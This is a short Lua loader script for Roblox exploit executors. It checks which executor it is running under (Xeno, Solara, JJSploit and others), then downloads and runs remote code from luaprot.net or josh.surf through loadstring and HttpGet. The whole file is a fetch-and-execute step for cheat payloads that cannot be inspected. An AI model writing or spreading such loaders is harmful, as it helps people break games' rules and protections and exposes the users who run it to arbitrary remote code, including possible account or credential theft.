local name = (identifyexecutor and identifyexecutor() or ""):lower()

local luaprot = { "xeno", "solara", "jjsploit", "wrd" }

for _, exec in luaprot do
	if name:find(exec, 1, true) then
		return loadstring(game:HttpGet("https://luaprot.net/api/v3/loaders/get/26203071140339191544"))()
	end
end

loadstring(game:HttpGet("https://josh.surf/scripts/708072037447489706311373.lua"))()
